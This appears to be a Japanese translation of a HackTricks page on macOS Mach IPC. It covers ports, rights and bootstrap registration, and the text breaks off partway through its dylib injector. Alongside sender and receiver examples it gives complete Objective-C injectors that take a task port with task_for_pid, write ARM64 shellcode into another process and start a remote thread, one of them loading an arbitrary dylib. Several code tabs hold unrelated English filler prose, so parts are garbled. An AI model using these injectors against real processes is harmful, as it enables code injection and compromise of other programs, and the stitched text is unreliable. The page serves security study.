# macOS IPC - プロセス間通信

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で私をフォローする🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
- **ハッキングトリックを共有するには、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>

## ポートを介したMachメッセージング

### 基本情報

Machはリソースを共有するための**最小単位としてタスク**を使用し、各タスクには**複数のスレッド**が含まれることができます。これらの**タスクとスレッドは、1:1でPOSIXプロセスとスレッドにマップされます**。

タスク間の通信は、Machプロセス間通信（IPC）を介して行われ、一方向の通信チャネルを利用します。**メッセージはポート間で転送**され、これらはカーネルによって管理される**メッセージキューのように機能**します。

各プロセスには**IPCテーブル**があり、そこにはプロセスの**Machポート**が見つかります。Machポートの名前は実際には数値（カーネルオブジェクトへのポインタ）です。

プロセスはまた、**別のタスクにポート名といくつかの権限を送信**することができ、カーネルはこれを他のタスクの**IPCテーブルにエントリとして表示**します。

### ポート権限

タスクが実行できる操作を定義する**ポート権限**は、この通信に重要です。可能な**ポート権限**は以下の通りです（[ここからの定義](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)）：

- **受信権限**：ポートに送信されたメッセージを受信する権限。MachポートはMPSC（multiple-producer, single-consumer）キューであり、システム全体で**各ポートにつき1つの受信権限しか存在しない**ことを意味します（複数のプロセスが1つのパイプの読み取り端に対するファイルディスクリプタを持つことができるパイプとは異なります）。
- **受信権限を持つタスク**はメッセージを受信し、**送信権限を作成**できるため、メッセージを送信できます。元々は**自分のタスクが自分のポートに対して受信権限を持っていました**。
- **送信権限**：ポートにメッセージを送信する権限。
- 送信権限は**クローン**できるため、送信権限を所有するタスクは権限を複製して**第三のタスクに付与**できます。
- **一度だけ送信権限**：ポートに1度だけメッセージを送信し、その後消える権限。
- **ポートセット権限**：単一のポートではなく_ポートセット_を示す権限。ポートセットからメッセージをデキューすると、それに含まれるポートの1つからメッセージがデキューされます。ポートセットは、Unixの`select`/`poll`/`epoll`/`kqueue`のように複数のポートで同時にリッスンするために使用できます。
- **デッドネーム**：実際のポート権限ではなく、単なるプレースホルダーです。ポートが破棄されると、ポートへのすべての既存のポート権限がデッドネームに変わります。

**タスクはSEND権限を他のタスクに転送**して、メッセージを返信できるようにします。**SEND権限はクローン**されることもあり、タスクは権限を複製して**第三のタスクに付与**できます。これにより、**ブートストラップサーバ**と呼ばれる中間プロセスと組み合わせることで、タスク間の効果的な通信が可能となります。

### 通信の確立

#### 手順：

通信チャネルを確立するために、**ブートストラップサーバ**（macでは**launchd**）が関与します。

1. タスク**A**は**新しいポート**を初期化し、プロセス内で**受信権限**を取得します。
2. 受信権限の所有者であるタスク**A**は、ポートに対して**送信権限を生成**します。
3. タスク**A**は、**ブートストラップサーバ**と**ポートのサービス名**、および**送信権限**を提供して、**ブートストラップ登録**として知られる手順を通じて**接続**を確立します。
4. タスク**B**は、**ブートストラップサーバ**と**サービス**名のブートストラップ**ルックアップ**を実行します。成功すると、**サーバ**はタスクAから受け取った**SEND権限を複製**し、**タスクBに送信**します。
5. SEND権限を取得した後、タスク**B**は**メッセージを作成**し、それを**タスクAに送信**できます。
6. 双方向通信の場合、通常、タスク**B**は**受信権限**と**送信権限**を持つ新しいポートを生成し、**SEND権限をタスクAに与え**ます（双方向通信）。

ブートストラップサーバは、タスクが主張するサービス名を**認証できません**。これは、タスクが潜在的に**任意のシステムタスクをなりすます**可能性があることを意味します。
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
プロセスが _**受信権限**_ を持っている場合、Mach ポートでメッセージを受信できます。逆に、**送信者** は _**送信権限**_ または _**一度だけ送信権限**_ を付与されます。一度だけ送信権限は、1回のメッセージ送信後に無効になります。

簡単な **双方向通信** を実現するために、プロセスは **mach メッセージヘッダー** で _返信ポート_ (**`msgh_local_port`**) と呼ばれる mach ポートを指定できます。メッセージの **受信者** はこのメッセージに対して返信を送信できます。**`msgh_bits`** のビットフラグを使用して、このポートに対して **一度だけ送信権限** が派生して転送されることを示すことができます (`MACH_MSG_TYPE_MAKE_SEND_ONCE`)。

{% hint style="success" %}
XPC メッセージで期待される返信を受信するためにこの種の双方向通信が使用されます (`xpc_connection_send_message_with_reply` および `xpc_connection_send_message_with_reply_sync`)。ただし、通常は異なるポートが作成され、双方向通信が確立されます。
{% endhint %}

メッセージヘッダーの他のフィールドは次のとおりです:

* `msgh_size`: パケット全体のサイズ。
* `msgh_remote_port`: このメッセージが送信されるポート。
* `msgh_voucher_port`: [mach バウチャー](https://robert.sesek.com/2023/6/mach\_vouchers.html)。
* `msgh_id`: 受信者によって解釈されるこのメッセージの ID。

{% hint style="danger" %}
**mach メッセージは**_**mach ポート**_**を介して送信され、これは mach カーネルに組み込まれた**単一の受信者**、**複数の送信者**通信チャネルです。**複数のプロセス**が mach ポートにメッセージを送信できますが、いつでも**1つのプロセスだけが**それから読み取ることができます。
{% endhint %}

### ポートの列挙
```bash
lsmp -p <pid>
```
iOSでこのツールをインストールするには、[http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) からダウンロードしてください。

### コード例

**sender** がポートを**割り当て**、名前 `org.darlinghq.example` の**送信権**を作成し、それを**ブートストラップサーバー**に送信する方法に注目してください。送信者はその名前の**送信権**を要求し、それを使用して**メッセージを送信**しました。

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}

### macOS IPC Inter-Process Communication

Inter-process communication (IPC) is a mechanism that allows processes to communicate and share data with each other. In macOS, IPC can be achieved using various techniques such as Mach ports, XPC services, and distributed notifications.

#### Mach Ports

Mach ports are a fundamental IPC mechanism in macOS. They allow processes to send messages and data to each other. Mach ports can be used for local IPC within the same system or for remote IPC between different systems.

#### XPC Services

XPC services are a high-level IPC mechanism provided by macOS. They allow processes to create and manage lightweight services that can communicate with each other. XPC services are commonly used for inter-process communication in macOS applications.

#### Distributed Notifications

Distributed notifications are a way for processes to broadcast information to other processes. This mechanism allows processes to observe changes and events happening in the system. Distributed notifications can be used for various purposes, such as triggering actions based on system events.

Understanding these IPC mechanisms is essential for developing secure and efficient macOS applications. By leveraging IPC effectively, developers can create robust applications that communicate seamlessly and securely with each other.

{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
### 特権ポート

- **ホストポート**: プロセスがこのポートに対して**Send**権限を持っている場合、**システム**に関する**情報**（例：`host_processor_info`）を取得できます。
- **ホスト特権ポート**: このポートに対して**Send**権限を持つプロセスは、カーネル拡張機能の読み込みなどの**特権アクション**を実行できます。この権限を取得するには、**プロセスはrootである必要があります**。
- さらに、**`kext_request`** APIを呼び出すには、Appleのバイナリにのみ与えられる**`com.apple.private.kext*`**という他の権限が必要です。
- **タスク名ポート**: _タスクポート_の権限がないバージョンです。タスクを参照しますが、それを制御することはできません。これを介して利用可能なのは`task_info()`だけです。
- **タスクポート**（別名カーネルポート）**: このポートに対してSend権限があると、タスクを制御できます（メモリの読み書き、スレッドの作成など）。
- 呼び出し`mach_task_self()`を使用して、呼び出し元タスクのためのこのポートの**名前を取得**します。このポートは**`exec()`**を横断してのみ**継承**されます。`fork()`で作成された新しいタスクは新しいタスクポートを取得します（特別なケースとして、suidバイナリ内の`exec()`後にもタスクは新しいタスクポートを取得します）。タスクを生成し、そのポートを取得する唯一の方法は、`fork()`を実行しながら["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)を実行することです。
- これらは、ポートへのアクセス制限です（バイナリ`AppleMobileFileIntegrity`の`macos_task_policy`から）：
  - アプリが**`com.apple.security.get-task-allow`権限**を持っている場合、**同じユーザーのプロセスがタスクポートにアクセス**できます（デバッグ用にXcodeによって一般的に追加されます）。**ノータリゼーション**プロセスは、本番リリースではこれを許可しません。
  - **`com.apple.system-task-ports`**権限を持つアプリは、カーネルを除く**任意の**プロセスの**タスクポートを取得**できます。以前のバージョンでは**`task_for_pid-allow`**と呼ばれていました。これはAppleアプリケーションにのみ付与されます。
  - **Rootは、ハード化されたランタイムでコンパイルされていないアプリケーションのタスクポート**にアクセスできます（Apple製品ではないもの）。

### タスクポートを介したスレッドへのシェルコードインジェクション

シェルコードは以下から取得できます：

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}

## macOS IPC (Inter-Process Communication)

### Introduction

Inter-Process Communication (IPC) mechanisms are essential for processes to communicate with each other on macOS. There are various IPC mechanisms available on macOS, such as Mach ports, XPC services, Distributed Objects, and UNIX domain sockets.

### Mach Ports

Mach ports are a fundamental IPC mechanism on macOS, allowing processes to send messages and data between each other. They are used by the system and applications for various purposes, including inter-process communication and synchronization.

### XPC Services

XPC Services are a high-level IPC mechanism provided by the XPC framework on macOS. They allow applications to create separate processes to perform specific tasks in a secure and isolated manner. XPC Services are commonly used for background tasks and privileged operations.

### Distributed Objects

Distributed Objects is an IPC mechanism that allows objects to be passed between processes on macOS. It enables applications to communicate and share objects across different processes, providing a way to interact with remote objects as if they were local.

### UNIX Domain Sockets

UNIX domain sockets are a type of IPC mechanism that allows communication between processes on the same host. They provide a way for processes to exchange data locally without going through the network stack. UNIX domain sockets are commonly used for inter-process communication within a single system.

### Conclusion

Understanding the different IPC mechanisms available on macOS is crucial for developers and security professionals to design secure and efficient communication between processes. Each IPC mechanism has its strengths and use cases, and choosing the right one depends on the specific requirements of the application or system.

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

前のプログラムを**コンパイル**し、同じユーザーでコードをインジェクトできるように**権限**を追加します（そうでない場合は**sudo**を使用する必要があります）。

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>  

## macOS IPC (Inter-Process Communication)

### macOS IPC Overview

Inter-Process Communication (IPC) mechanisms are essential for processes to communicate and coordinate with each other on macOS. There are various IPC mechanisms available on macOS, including Mach ports, XPC services, Distributed Objects, and UNIX domain sockets. Understanding how these mechanisms work is crucial for both developers and security professionals to ensure secure communication between processes and prevent privilege escalation attacks.
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### タスクポート経由でスレッドにおけるDylibのインジェクション

macOSでは、**スレッド**は**Mach**を使用するか**posix `pthread` api**を使用して操作される可能性があります。前回のインジェクションで生成したスレッドはMach apiを使用して生成されたため、**posixに準拠していません**。

**単純なシェルコードをインジェクト**してコマンドを実行することが可能でしたが、これは**posixに準拠する必要がなかった**ため、Machだけで動作しました。**より複雑なインジェクション**を行うには、スレッドが**posixに準拠している必要があります**。

したがって、スレッドを**改善する**ためには、**`pthread_create_from_mach_thread`**を呼び出すべきです。これにより、有効なpthreadが作成されます。その後、この新しいpthreadは**dlopenを呼び出して**システムから**dylibをロード**することができます。つまり、異なるアクションを実行するための新しいシェルコードを書く代わりに、カスタムライブラリをロードすることが可能です。

例えば、（ログを生成してそれを聞くことができるものなど）**例のdylibs**を以下で見つけることができます：

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

